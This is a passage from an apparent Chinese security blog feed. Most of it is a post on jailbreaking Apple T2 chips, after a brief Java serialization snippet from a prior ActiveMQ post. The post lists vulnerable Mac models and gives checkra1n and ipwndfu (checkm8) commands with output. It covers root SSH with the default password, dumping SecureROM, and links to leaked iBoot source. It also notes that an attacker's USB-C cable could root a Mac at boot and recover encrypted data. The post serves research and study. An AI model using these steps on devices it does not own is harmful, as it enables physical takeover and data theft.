class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream stream) throws InvalidObjectException &#123; throw new </span><br><span class="line">InvalidObjectException(&quot;Proxy required&quot;); &#125;</span><br><span class="line"> static final class SerializationProxy&lt;K, V&gt;</span><br><span class="line"> extends Object</span><br><span class="line"> implements Serializable</span><br><span class="line"> &#123;</span><br><span class="line"> final EntryWeigher&lt;? super K, ? super V&gt; weigher;</span><br><span class="line"> final EvictionListener&lt;K, V&gt; listener;</span><br><span class="line"> final int concurrencyLevel;</span><br><span class="line"> final Map&lt;K, V&gt; data;</span><br><span class="line"> final long capacity;</span><br><span class="line"> static final long serialVersionUID &#x3D; 1L;</span><br><span class="line"> SerializationProxy(ConcurrentLinkedHashMap&lt;K, V&gt; map) &#123;</span><br><span class="line"> this.concurrencyLevel &#x3D; map.concurrencyLevel;</span><br><span class="line"> this.data &#x3D; new HashMap(map);</span><br><span class="line"> this.capacity &#x3D; map.capacity.get();</span><br><span class="line"> this.listener &#x3D; map.listener;</span><br><span class="line"> this.weigher &#x3D; map.weigher;</span><br><span class="line"> &#125;</span><br><span class="line"> Object readResolve() &#123;</span><br><span class="line"> ConcurrentLinkedHashMap&lt;K, V&gt; map &#x3D; (new ConcurrentLinkedHashMap.Builder()).concurrencyLevel(this.</span><br><span class="line">concurrencyLevel).maximumWeightedCapacity(this.capacity).listener(this.listener).weigher(this.weigher).build();</span><br><span class="line"> map.putAll(this.data);</span><br><span class="line"> return map;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ActiveMQ" scheme="http://www.ol4three.com/tags/ActiveMQ/"/>
    
  </entry>
  
  <entry>
    <title>Jailbreak_Apple_T2_Chip的相关研究</title>
    <link href="http://www.ol4three.com/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/"/>
    <id>http://www.ol4three.com/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/</id>
    <published>2020-12-03T08:51:10.000Z</published>
    <updated>2020-12-15T06:51:52.681Z</updated>
    
    <content type="html"><![CDATA[<p>先放一张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215144432769.png" alt="image-20201215144432769"></p><p>更新中…</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/rfh6qOxsLWInTGKc.jpg" alt="Apple T2 chip"></p><h2 id="0x00-Apple-T2-芯片"><a href="#0x00-Apple-T2-芯片" class="headerlink" title="0x00 Apple T2 芯片"></a>0x00 Apple T2 芯片</h2><p>首先什么是<strong>苹果T2芯片</strong>呢苹果官网给出的是：Apple T2 安全芯片是 Apple 设计的第二代定制化 Mac 芯片。通过对其他 Mac 电脑中的几款控制器进行重新设计与整合，例如系统管理控制器、图像信号处理器、音频控制器和 SSD 控制器，T2 芯片为 Mac 带来了多项新功能。</p><p>例如，T2 芯片让安全性又上新台阶，它所包含的安全隔区协处理器可保护<a href="https://support.apple.com/zh-cn/HT207054">触控 ID</a> 数据，并为新的<a href="https://support.apple.com/zh-cn/HT208344">加密储存</a>和<a href="https://support.apple.com/zh-cn/HT208330">安全启动</a>功能奠定了基础。此外，T2 芯片的图像信号处理器与 FaceTime 高清摄像头配合，进一步提升色调映射和曝光控制，还能基于面部识别技术进行自动曝光并自动调节白平衡。</p><p>总结起来就是说是一个值得信赖的安全芯片。T2保护基本功能，例如安全启动，激活锁，Touch ID，加密数据存储，安全启动，图像信号技术等。</p><p><strong>Apple T2安全芯片如何工作？</strong>Apple T2芯片可以控制MacOS的启动过程。它可以确保用户安装Apple认可的驱动器。只要在Mac计算机上按下电源按钮，它就会开始工作，一直持续到您看到MacOS桌面为止。换句话说，其主要功能之一就是验证Apple是否已签署您的操作系统和引导程序。</p><p>T2还负责硬盘驱动器上的所有加密数据。在以前的Mac版本中，此功能由CPU执行，从而使其负担沉重。通过将这些功能转移到T2芯片上，Apple大大改善了新Mac的性能。T2为CPU提供了更多资源。该芯片可确保MacBook Air和MacBook Pro中提供的Touch ID功能。这些设备中的指纹扫描仪为用户提供了快速登录选项，并批准了管理员级别的请求。Apple T2芯片有助于安全地存储指纹数据。</p><p>它还处理来自不同应用程序的验证请求。T2芯片可确保没有应用程序可以通过Touch ID或Face访问您的指纹信息。当请求验证时，Apple T2安全芯片将指纹与安全区协处理器中保护的数据进行比较，并通知结果。</p><h2 id="0x01-具备Apple-T2的设备"><a href="#0x01-具备Apple-T2的设备" class="headerlink" title="0x01 具备Apple T2的设备"></a>0x01 具备Apple T2的设备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2020 年推出的 iMac</span><br><span class="line">iMac Pro</span><br><span class="line">2019 年推出的 Mac Pro</span><br><span class="line">2018 年推出的 Mac mini</span><br><span class="line">2018 年或之后推出的 MacBook Air</span><br><span class="line">2018 年或之后推出的 MacBook Pro</span><br></pre></td></tr></table></figure><p>可以在<strong>“系统信息”</strong>里面查看自己的Mac是否配备了T2芯片</p><ol><li>在按住 Option 键的同时，选取苹果 () 菜单 &gt;“系统信息”。</li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macos-about-this-mac-system-report-controller-t2.png" alt="img"></p><h3 id="对应的Mac的EMC编号如下"><a href="#对应的Mac的EMC编号如下" class="headerlink" title="对应的Mac的EMC编号如下"></a>对应的Mac的EMC编号如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">iMac Pro：</span><br><span class="line">EMC – 3144（型号A1862 – 2017）</span><br><span class="line"></span><br><span class="line">Mac Pro：</span><br><span class="line">EMC – 3203（模型A1991 – 2019）</span><br><span class="line">EMC – 3413（A2304型（机架）– 2019年）</span><br><span class="line"></span><br><span class="line">Mac Mini：</span><br><span class="line">EMC – 3213（模型A1993 – 2018）</span><br><span class="line">EMC – TBD（TBD型号– 2020）</span><br><span class="line"></span><br><span class="line">MacBook Pro：</span><br><span class="line">EMC – 3214（模型A1989 – 2018）</span><br><span class="line">EMC – 3215（型号A1990 – 2018）</span><br><span class="line">EMC – 3358（A1989型– 2019年）</span><br><span class="line">EMC – 3359（型号A1990 – 2019）</span><br><span class="line">EMC – 3301（型号A2159 – 2019）</span><br><span class="line">EMC – 3347（型号A2141 – 2019）</span><br><span class="line">EMC – 3348（型号A2251 – 2020）</span><br><span class="line">EMC – 3456（型号A2289 – 2020）</span><br><span class="line"></span><br><span class="line">MacBook Air：</span><br><span class="line">EMC – 3184（型号A1932 – 2018和2019）</span><br><span class="line">EMC – 3302（型号A2179 – 2020）</span><br></pre></td></tr></table></figure><h3 id="以下模型容易受到攻击"><a href="#以下模型容易受到攻击" class="headerlink" title="以下模型容易受到攻击"></a>以下模型容易受到攻击</h3><table><thead><tr><th><strong>iBridge产品编号</strong></th><th><strong>板号</strong></th><th>board minor</th><th><strong>说明（产品编号）</strong></th><th><strong>checkm8 / blackbird确认</strong></th></tr></thead><tbody><tr><td>iBridge2,1</td><td>J137AP</td><td>0x0A</td><td>苹果T2 iMacPro1,1（j137）</td><td>是</td></tr><tr><td>iBridge2,3</td><td>J680AP</td><td>0x0B</td><td>苹果T2 MacBookPro15,1（j680）</td><td>是</td></tr><tr><td>iBridge2,4</td><td>J132AP</td><td>0x0C</td><td>苹果T2 MacBookPro15,2（j132）</td><td>是</td></tr><tr><td>iBridge2,5</td><td>J174AP</td><td>0x0E</td><td>苹果T2 Macmini8,1（j174）</td><td>是</td></tr><tr><td>iBridge2,6</td><td>J160AP</td><td>0x0F</td><td>苹果T2 MacPro7,1（j160）</td><td>是</td></tr><tr><td>iBridge2,7</td><td>J780AP</td><td>0x07</td><td>苹果T2 MacBookPro15,3（j780）</td><td>是</td></tr><tr><td>iBridge2,8</td><td>J140kAP</td><td>0x17</td><td>苹果T2 MacBookAir8,1（j140k）</td><td>是</td></tr><tr><td>iBridge2,10</td><td>J213AP</td><td>0x18</td><td>苹果T2 MacBookPro15,4（j213）</td><td>是</td></tr><tr><td>iBridge2,11</td><td>J230AP</td><td>0x1F</td><td>？</td><td>？</td></tr><tr><td>iBridge2,12</td><td>J140aAP</td><td>0x37</td><td>苹果T2 MacBookAir8,2（j140a）</td><td>是</td></tr><tr><td>iBridge2,13</td><td>J214AP</td><td>0x1E</td><td>？</td><td>？</td></tr><tr><td>iBridge2,14</td><td>J152fAP</td><td>0x3A</td><td>苹果T2 MacBookPro16,1（j152f）</td><td>是</td></tr><tr><td>iBridge2,15</td><td>J230kAP</td><td>0x3F</td><td>苹果T2 MacBookAir9,1（j223k）</td><td>是</td></tr><tr><td>iBridge2,16</td><td>J214kAP</td><td>0x3E</td><td>？</td><td>？</td></tr><tr><td>iBridge2,19</td><td>J185AP</td><td>0x22</td><td>？</td><td>？</td></tr><tr><td>iBridge2,20</td><td>J185fAP</td><td>0x23</td><td>？</td><td>？</td></tr><tr><td>iBridge2,21</td><td>J223AP</td><td>0x3B</td><td>？</td><td>？</td></tr><tr><td>iBridge2,22</td><td>J215AP</td><td>0x38</td><td>？</td><td>？</td></tr></tbody></table><h2 id="0x02-T2芯片的MacOS安全启动过程"><a href="#0x02-T2芯片的MacOS安全启动过程" class="headerlink" title="0x02 T2芯片的MacOS安全启动过程"></a>0x02 T2芯片的MacOS安全启动过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 即使Mac设备已关闭，T2芯片也已完全启动并保持开启状态。</span><br><span class="line"></span><br><span class="line">2. 按下电源按钮或打开机盖会触发系统管理控制器（SMC）引导。</span><br><span class="line"></span><br><span class="line">3. SMC执行加电自检（POST），以检测任何EFI或硬件问题，例如RAM损坏，并可能重定向到Recovery。</span><br><span class="line"></span><br><span class="line">4. 在进行了基本的健康检查之后，将触发T2芯片并设置I &#x2F; O连接器。（USB，NVMe，PCIe等），它将使用NVMe和PCIe与NAND存储进行通信。</span><br><span class="line"></span><br><span class="line">5. 选择适用的启动磁盘，然后询问是否启用了磁盘加密密码以 可能通过FileVault2磁盘加密来挂载 [APFS](https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Apple_File_System)卷。</span><br><span class="line"></span><br><span class="line">6. &#x2F;System&#x2F;Library&#x2F;CoreServices&#x2F;boot.efi位于系统APFS卷上，并且 [根据您的安全启动设置 ](https:&#x2F;&#x2F;support.apple.com&#x2F;en-us&#x2F;HT208330)进行了验证。</span><br><span class="line"></span><br><span class="line">7. 运行boot.efi来加载Darwin内核（回退到BSD）（如果启动Microsoft Windows，则启动Boot Camp）和IODevice驱动程序。如果在&#x2F; System &#x2F; Library &#x2F; PrelinkedKernels &#x2F; prelinkedkernel中找到了内核缓存，它将使用该缓存。</span><br><span class="line"></span><br><span class="line">8. 如果用户批准的内核扩展已被T2芯片批准，则将其初始化并添加到内核空间。这将随着系统扩展而消失。</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macOS-secure-booting.png" alt="img"></p><h2 id="0x03-越狱步骤"><a href="#0x03-越狱步骤" class="headerlink" title="0x03 越狱步骤"></a>0x03 越狱步骤</h2><h4 id="需要设备："><a href="#需要设备：" class="headerlink" title="需要设备："></a>需要设备：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.一台带有T2芯片的Mac</span><br><span class="line">2.另一个MacOS（不知道虚拟机是否可以）；</span><br><span class="line">3.USB-C至USB-C电缆。Macbook附带的就可以。</span><br></pre></td></tr></table></figure><h4 id="1-从官方网站下载最新版本的Checkra1n-T2越狱工具。"><a href="#1-从官方网站下载最新版本的Checkra1n-T2越狱工具。" class="headerlink" title="1.从官方网站下载最新版本的Checkra1n T2越狱工具。"></a>1.从<a href="https://checkra.in/releases/">官方网站</a>下载最新版本的Checkra1n T2越狱工具。</h4><p>​    <a href="https://checkra.in/releases/">https://checkra.in/releases/</a></p><h4 id="2-将Mac置于DFU模式。"><a href="#2-将Mac置于DFU模式。" class="headerlink" title="2.将Mac置于DFU模式。"></a>2.将Mac置于DFU模式。</h4><p>如何进入MacOS DFU模式](<a href="https://checkm8.info/blog/dfu-mode-mac">https://checkm8.info/blog/dfu-mode-mac</a>)</p><p>如何置于DFU模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.需要两台电脑</span><br><span class="line">2.Apple Configurator 2</span><br><span class="line">3.usb-c线插到电脑左侧第二个接口</span><br><span class="line">4.按住电源按钮1s</span><br><span class="line">5.同时按住左control、左option和右shift 持续8s</span><br><span class="line">6.Configurator 2显示为DFU模式</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/aeb34551b54ee063316ea5c98f7c617e.png" alt="Apple Configurator 2 显示 Mac进入了DFU模式"></p><p>检查设备是否已经进入DFU模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioregg -p IOUSB</span><br></pre></td></tr></table></figure><h4 id="3-使用CLI，Checkra1n的命令行版本"><a href="#3-使用CLI，Checkra1n的命令行版本" class="headerlink" title="3.使用CLI，Checkra1n的命令行版本"></a>3.使用CLI，Checkra1n的命令行版本</h4><p><strong>Checkra1n GUI版本0.11.0不支持T2越狱。</strong></p><p>如果用Checkra1n工具连接带有T2的Mac，会报以下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, your device is not supported.</span><br></pre></td></tr></table></figure><h4 id><a href="#" class="headerlink" title></a></h4><p>在Finder中打开Checkra1n应用程序，然后右键单击它以查看“显示包装内容”菜单</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak.png" alt="img" style="zoom:50%;"><p>现在转到文件夹<code>Contents =&gt; MacOS</code>。可以看到Checkra1n二进制文件。打开终端应用程序，然后将二进制文件拖放到<code>&quot;Terminal.&quot;</code></p><p>或者，如果将Checkra1n应用程序放入“应用程序”文件夹，则可以在以下命令中键入以下命令 <code>&quot;Terminal:&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;checkra1n.app&#x2F;Contents&#x2F;MacOS&#x2F;checkra1n</span><br></pre></td></tr></table></figure><h4 id="4-通过-c来启动命令行版本"><a href="#4-通过-c来启动命令行版本" class="headerlink" title="4.通过-c来启动命令行版本"></a>4.通过-c来启动命令行版本</h4><p>同时开启 -v 来检查越狱日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;checkra1n.app&#x2F;Contents&#x2F;MacOS&#x2F;checkra1n -c -v</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-20201126102132819.png" alt="img"></p><p>如果报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Timed out waiting for bootstrap upload (error code: -20)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-chip-20201126102147333.png" alt="img"></p><p>在这种情况下，请重新启动Checkra1n CLI工具，直到看到引导程序成功安装的消息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: Bootstrap already installed, done</span><br></pre></td></tr></table></figure><p>可能需要重试几次才能完成。</p><h4 id="5-通过SSH进入越狱的Apple-T2芯片"><a href="#5-通过SSH进入越狱的Apple-T2芯片" class="headerlink" title="5.通过SSH进入越狱的Apple T2芯片"></a>5.通过SSH进入越狱的Apple T2芯片</h4><p>成功越狱之后打开一个新的终端窗口，然后输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iproxy 2222 44</span><br></pre></td></tr></table></figure><p>不要关闭此窗口并再打开一个终端窗口<code>(Command + T)</code>。输入此命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@localhost -p 2222</span><br></pre></td></tr></table></figure><p>密码是： <code>alpine</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-security-chip.png" alt="img"></p><h2 id="0x04-具体原理"><a href="#0x04-具体原理" class="headerlink" title="0x04 具体原理"></a>0x04 具体原理</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201202201030024.png" alt="image-20201202201030024" style="zoom:50%;"><h3 id="核心问题："><a href="#核心问题：" class="headerlink" title="核心问题："></a>核心问题：</h3><p>T2安全芯片上的SepOS微型操作系统是包含基于IOS A10的处理器，据说A12的芯片似乎解决了这个问题，但是未确认</p><p>在Twitter和Reddit上提到由于T2芯片和iPhone及其底层硬件之间共享某些硬件和软件功能。通过结合最初越狱iphone的checkm8 + blackbird两个漏洞便可以越狱T2安全芯片的Mac和Macbook设备</p><p>根据 <a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">比利时安全公司ironPeak的帖子</a>，越狱T2安全芯片涉及通过USB-C连接到Mac / MacBook，并 在Mac的启动过程中运行<a href="https://checkra.in/">Checkra1n越狱软件</a>的<a href="https://checkra.in/">0.11.0</a>版本 。</p><p>根据ironPeak的说法，这之所以奏效，是因为“ Apple在向客户提供的T2安全芯片中打开调试界面，允许任何人无需身份验证即可进入设备固件更新（DFU）模式。”</p><p>使用这种方法，可以创建一条USB-C电缆，该电缆可以在启动时自动利用您的macOS设备。</p><p>这使攻击者可以在T2芯片上获得root用户访问权限，并修改和控制目标设备上运行的所有内容，甚至可以恢复加密的数据。</p><h3 id="1-Checkm8"><a href="#1-Checkm8" class="headerlink" title="1.Checkm8"></a>1.Checkm8</h3><p>一句话描述漏洞：对USB请求处理不当造成的UAF漏洞。手里有一个iphone5s，所以决定研究一下checkm8这个漏洞。</p><h4 id="上手尝试"><a href="#上手尝试" class="headerlink" title="上手尝试"></a>上手尝试</h4><p>在分析这个漏洞之前，先对checkm8有一个感性直观的认识，我们首先动动手，做俩实验：分别是使用checkra1n越狱，以及使用ipwndfu提取固化在处理器芯片中的固件代码(SecureROM)。不过在动手之前，先阅读以下写给科技爱好者的文章和广大网友对这个漏洞的讨论：</p><ul><li><a href="https://new.qq.com/omn/20190929/20190929A0QNVW00.html">苹果现史诗级漏洞：iPhone可永久越狱，库克却束手无策！</a></li><li><a href="https://www.expreview.com/70777.html">有问有答：为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？</a></li><li><a href="https://www.zhihu.com/question/348168793">如何看待苹果 A5-A11 芯片的「史诗级越狱漏洞」Checkm8？影响有多大？</a></li></ul><h4 id="checkra1n-越狱"><a href="#checkra1n-越狱" class="headerlink" title="checkra1n 越狱"></a>checkra1n 越狱</h4><p>使用<a href="https://checkra.in/">checkra1n</a>，基本就是傻瓜操作。不过与普通越狱不同的是，在使用这个工具越狱后，并不需要安装cydia，即可在爱思助手直接开始ssh通道。ssh通道这个功能是将手机的22端口通过usb映射到电脑主机的端口，第一次用可能会迷糊。默认的用户名密码是：<code>root:alpine</code>，如果不熟悉越狱和ssh流程，可以参考如下文章：</p><ul><li><a href="https://www.jianshu.com/p/aa007c10a7a1?from=singlemessage">IOS 13.3 checkRa1n 越狱</a></li><li><a href="http://www.veryitman.com/2018/05/12/iOS-逆向-越狱使用-SSH/">iOS 逆向: 越狱使用 SSH</a></li></ul><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203102556462.png" alt="image-20201203102556462" style="zoom:50%;"><p>另外发现ssh虽然开启，也可以由外部连入本机的22端口，但是并不能本机自己连自己，即并不能在手机上安装一个ssh客户端软件来访问自己的shell，这里苹果做了限制，绕过方式是修改ssh服务端口并重启，参考如下：</p><ul><li><a href="https://www.jianshu.com/p/a2c02b8c27f5">iOS 已越的设备SSH localhost</a></li><li><a href="https://apple.stackexchange.com/questions/159361/unable-to-ssh-rootlocalhost-on-jailbroken-ipad-with-ios-8-1">Unable to ssh root@localhost on jailbroken iPad with iOS 8.1</a></li></ul><h4 id="ipwndfu-提取-SecureROM"><a href="#ipwndfu-提取-SecureROM" class="headerlink" title="ipwndfu 提取 SecureROM"></a>ipwndfu 提取 SecureROM</h4><p>使用<a href="https://github.com/axi0mX/ipwndfu/">ipwndfu</a>完成dump固件。但是其并不是对任何iPhone都支持，在readme中可见支持说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current SoC support: s5l8947x, s5l8950x, s5l8955x, s5l8960x, t8002, t8004, t8010, t8011, t8015</span><br><span class="line">future SoC support: s5l8940x, s5l8942x, s5l8945x, s5l8747x, t7000, t7001, s7002, s8000, s8001, s8003, t8012</span><br></pre></td></tr></table></figure><p>这些SoC版本对应的苹果设备型号可以参考：<a href="https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考">https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考</a></p><p><a href="https://www.i4.cn/news_detail_30618.html">iPhone 进恢复模式和 DFU 模式有什么区别？</a>，iPhone 5s 进入DFU 模式的方法：<br>1、打开iTune<br>2、按住苹果顶部的power键3秒;<br>3、不要松开power键同时按住home键10秒;<br>4、松开power键继续按住home键，一直到iTunes会自动检测到出于恢复模式的iPhone后再松开</p><p>安装libusb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install libusb</span><br></pre></td></tr></table></figure><p>然后在ipwndfu目录<code>./ipwndfu -p</code>完成后门的植入，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╰─$ .&#x2F;ipwndfu -p                                                                                                                             127 ↵</span><br><span class="line">*** checkm8 exploit by axi0mX ***</span><br><span class="line">Found: CPID:8960 CPRV:11 CPFM:03 SCEP:01 BDID:02 ECID:00000635CB274B30 IBFL:1C SRTG:[iBoot-1704.10]</span><br><span class="line">Device is now in pwned DFU Mode.</span><br><span class="line">(13.54 seconds)</span><br></pre></td></tr></table></figure><p>成功之后即可在电脑的【关于本机】-&gt; 【系统报告】的USB设备详细信息中看到手机的USB序列号已经被更改：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203111159468.png" alt="image-20201203111159468"></p><p>然后dump固件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─$ sudo .&#x2F;ipwndfu --dump-rom</span><br><span class="line">Saved: SecureROM-s5l8960xsi-1704.10-RELEASE.dump</span><br></pre></td></tr></table></figure><p>可以与<a href="https://securerom.fun/这里下载的固件进行比对，经测试，固件是一致的。">https://securerom.fun/这里下载的固件进行比对，经测试，固件是一致的。</a></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ul><li><a href="https://zhuanlan.zhihu.com/p/87456653">iPhone史诗级漏洞checkm8攻击原理浅析</a></li><li><a href="https://m.habr.com/en/company/dsec/blog/472762/">Technical analysis of the checkm8 exploit</a></li><li><a href="https://www.anquanke.com/post/id/187864">iPhone BootROM 漏洞说明及威胁评估</a></li><li><a href="https://iokit.racing/oneweirdtrick.pdf">The One Weird Trick SecureROM Hates</a></li></ul><h5 id="iBoot源码泄露事件"><a href="#iBoot源码泄露事件" class="headerlink" title="iBoot源码泄露事件"></a>iBoot源码泄露事件</h5><blockquote><p>这是一切的开始。</p></blockquote><p>让我们来看一条2018年2月8日的新闻：<a href="https://mp.weixin.qq.com/s/YrZPxHttM4qoVgqz1YApJw">史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上</a>，再来看看当时的中国网民怎么说：</p><ul><li><a href="https://www.zhihu.com/question/266880039">iOS9源码泄露,是真的么?</a></li><li><a href="https://www.zhihu.com/question/266898229">如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？</a></li></ul><p>可见大部分网民还是吃瓜，因为不懂不了解，也就无法明白这份代码对于理解并破解iPhone的重要性。可以这么说，此次iboot源码的泄露是黑客发现checkm8这个漏洞的起点。但是苹果当时的回应是：<a href="http://tech.sina.com.cn/it/2018-02-09/doc-ifyrkuxs4997460.shtml">iOS 9源代码被泄露 苹果：该源代码已过时 不必担忧</a>。我们事后诸葛亮的来看这个事，可以说是大型打脸现场了，因为泄露的代码至今仍然没有过时。当年苹果公司说他们不在乎，泄露的都是过时的老代码，没有价值，可是他们当时是怎么做的呢？<a href="https://www.leiphone.com/news/201802/HAPYD8ulbmkJNqMt.html">GitHub泄露苹果iBoot源代码？苹果：全网删，谢谢</a>。真的都是江湖人，江湖事呀。那这份泄露的代码在哪呢？虽然在github找到不到了，不过，互联网是有记忆的，网民是万能的：</p><ul><li><a href="https://download.csdn.net/download/galaxy0011/10257969">iBoot源代码（含.git目录），来自Github</a></li><li><a href="https://bbs.pediy.com/thread-225000.htm">最近泄露的Apple iBoot/BootROM/Baseband源代码</a></li><li><a href="https://0x1.gitlab.io/phone/iBoot/">iBoot IOS 9.3 Leaked</a></li><li><a href="https://yalujailbreak.net/bootrom-iboot-source-code-leaked/">Twitter user leaks iOS 9 BootROM and iBoot source code online</a></li><li><a href="https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot">https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot</a></li></ul><p>这份泄露的代码主要是iBoot，相当于PC的BIOS层面的代码，不是做底层的程序员一般是看不明白。不过我们大概也猜到了，这些代码主要负责的就是iPhone的启动过程。启动，你会想到什么呢？</p><h5 id="iPhone的操作模式"><a href="#iPhone的操作模式" class="headerlink" title="iPhone的操作模式"></a>iPhone的操作模式</h5><p>刚才的两个小实验中，我们将iPhone经过按键的操作进入了DFU模式，其实iPhone还有一种模式叫恢复模式，这些称之为iPhone的操作模式：</p><ul><li><a href="https://beta.4hou.com/mobile/14346.html">iOS DFU和恢复模式的异同之处</a></li><li><a href="https://developer.aliyun.com/article/175407">iOS取证实战：调查、分析与移动安全：操作模式</a></li></ul><p>其实我们在其他设备上也有类似的操作，比如Android的recovery、fastboot、9008，PC的BIOS配置，Windows的安全模式，Mac的恢复模式等。这些操作都可以理解为进入了一个小系统，这些小系统可能为主系统的运行提供一些必要的支持，也可能作为备用系统以防主系统遭遇不测。我们一般通过在开机过程中按照顺序或者时间的要求按下一些按键，进入这些小系统。换句话说我们没有成功启动主系统，而启动了小系统，对，就是启动。那么这里每一个小系统都有着对应的代码实体，iPhone的DFU和恢复模式的代码实体又在哪呢？是不是iBoot呢？带着这个疑问让我们来看一下，苹果公司泄露的代码能不能回答这个问题。</p><h5 id="泄露源码分析"><a href="#泄露源码分析" class="headerlink" title="泄露源码分析"></a>泄露源码分析</h5><p>打开泄露的源码，大致浏览了一下目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╰─$ tree -N -L 2</span><br><span class="line">.</span><br><span class="line">├── 